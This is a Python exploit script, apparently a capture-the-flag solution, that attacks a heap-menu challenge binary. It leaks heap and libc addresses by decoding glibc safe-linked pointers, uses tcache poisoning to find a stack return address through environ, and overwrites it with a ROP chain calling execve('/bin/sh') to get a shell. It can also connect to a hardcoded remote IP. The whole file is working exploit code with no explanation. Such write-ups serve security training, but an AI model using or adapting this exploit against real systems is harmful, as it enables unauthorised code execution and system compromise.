#!/usr/bin/env python
import ptrlib as ptr
import sys

elf = ptr.ELF("./chall_patched")
libc = ptr.ELF("./libc.so.6")
ld = ptr.ELF("./ld-linux-x86-64.so.2")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        # return ptr.Socket("localhost", 7331)
        return ptr.Socket("13.125.233.58", 7331)
    else:
        return ptr.Process(elf.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("unwrap failed")
        exit(1)
    else:
        return x


def add(io, size: int, data: bytes):
    io.sendlineafter(">> ", "1")
    io.sendlineafter("input chunk size : ", str(size))
    io.sendlineafter("input chunk data : ", data)


def free(io, index: int):
    io.sendlineafter(">> ", "2")
    io.sendlineafter("input chunk id : ", str(index))


def modify(io, index: int, data: bytes):
    io.sendlineafter(">> ", "3")
    io.sendlineafter("input chunk id : ", str(index))
    io.sendlineafter("modify chunk data(max 40) : ", data)


def view(io, index: int) -> bytes:
    io.sendlineafter(">> ", "4")
    io.sendlineafter("input chunk id : ", str(index))
    data = io.recvuntil("1. add").strip(b"1. add")
    return data


def decrypt(cipher: int) -> int:
    key = 0
    plain = 0

    for i in range(6):
        bits = 64 - 12 * i
        if bits < 0:
            bits = 0
        plain = ((cipher ^ key) >> bits) << bits
        key = plain >> 12

    return plain


def main():
    io = connect()

    # fill tcache and create a chunk in unsorted bin
    add(io, 0x90, b"")  # 0
    add(io, 0x90, b"")  # 1
    add(io, 0x90, b"")  # 2
    add(io, 0x90, b"")  # 3

    add(io, 0x90, b"")  # 4
    add(io, 0x90, b"")  # 5
    add(io, 0x90, b"")  # 6
    add(io, 0x90, b"")  # 7

    free(io, 7)
    free(io, 6)
    free(io, 5)
    free(io, 4)
    free(io, 3)
    free(io, 2)
    free(io, 1)
    free(io, 0)

    # leak libc base
    add(io, 0x90, b"")  # 8
    cipher = ptr.u64(view(io, 8)[:8])
    heap_base = (decrypt(cipher) >> 12) << 12
    ptr.logger.info(f"heap_base: {hex(heap_base)}")

    # tcache poisoning to hijack head of tcache bin
    add(io, 0x18, b"")  # 9
    payload = b"A" * 3 * 8
    payload += ptr.p64(0xA1)
    payload += ptr.p64((heap_base + 0x500) >> 12 ^ heap_base + 0xD0)
    modify(io, 9, payload)

    add(io, 0x90, b"")  # 10
    add(io, 0x90, b"")  # 11
    add(io, 0x90, b"")  # 12

    # tcache poisoning to leak libc base
    modify(io, 12, ptr.p64(heap_base + 0x2C0))
    add(io, 0x90, b"")  # 13
    libc.base = ptr.u64(view(io, 13)[:8]) - 0x21AC0A

    # clean chunks to prevent error in malloc
    free(io, 10)
    free(io, 11)
    free(io, 13)

    # tcache poisoning to leak return address of add function
    modify(io, 12, ptr.p64(unwrap(libc.symbol("environ")) - 0x10))
    add(io, 0x90, b"")  # 14
    ret_addr = ptr.u64(view(io, 14)[0x10:0x18]) - 0x140
    ptr.logger.info(f"return_address: {hex(ret_addr)}")

    modify(io, 12, ptr.p64(ret_addr - 0x8))

    payload = b"A" * 8
    payload += ptr.p64(next(libc.gadget("ret;")))
    payload += ptr.p64(next(libc.gadget("pop rdi; ret;")))
    payload += ptr.p64(next(libc.find("/bin/sh")))
    payload += ptr.p64(next(libc.gadget("pop rsi; ret;")))
    payload += ptr.p64(0)
    payload += ptr.p64(next(libc.gadget("pop rax; ret;")))
    payload += ptr.p64(0x3B)
    payload += ptr.p64(next(libc.gadget("mov rdx, rsi; xor esi, esi; syscall;")))

    add(io, 0x90, payload)  # 15
    io.sh()


if __name__ == "__main__":
    main()
